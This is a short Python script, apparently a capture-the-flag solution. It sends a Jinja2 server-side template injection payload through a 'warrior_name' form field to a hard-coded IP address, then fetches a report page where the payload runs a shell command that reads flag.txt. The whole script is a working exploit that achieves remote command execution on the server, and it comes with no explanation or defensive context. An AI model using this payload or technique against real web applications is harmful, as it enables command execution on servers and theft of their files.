import requests

url = "http://94.237.53.203:59491"
ssti_payload = "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag.txt').read() }}"

with requests.Session() as s:
    begin_response = s.post(url + "/begin", data={"warrior_name" : ssti_payload})
    report_response = s.post(url + "/battle-report")
    print(report_response.text)